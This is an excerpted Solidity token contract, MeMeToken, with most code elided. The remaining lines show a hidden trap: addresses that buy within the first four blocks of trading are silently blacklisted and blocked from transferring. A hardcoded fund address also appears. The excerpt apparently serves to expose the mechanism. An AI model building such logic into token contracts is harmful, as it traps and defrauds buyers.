...
abstract contract MeMeToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _appList;
    ...
    function _transfer(
        ...
        if (antiBotEnable){
            if (startZone + checkBClistedBlockNumber < block.number){
                require(!_appList[from], 'bcd address');
            }
        }else{
            require(!_appList[from], 'bcd address');
        }
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if (block.number < startZone + 4 && !_swapPairList[to]) {
                    _appList[to] = true;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0xBBcD5649c37029E85f05674761C5be2f377750F1;
    ...
    function startTrade() external onlyOwner {
        require(0 == startZone, "trading");
        startZone = block.number;
    }
...
contract Token is MeMeToken {
    constructor() MeMeToken(
        ...
        18,
        2100000000000,
        address(0xBBcD5649c37029E85f05674761C5be2f377750F1),
        address(0xBBcD5649c37029E85f05674761C5be2f377750F1)
    ){}
}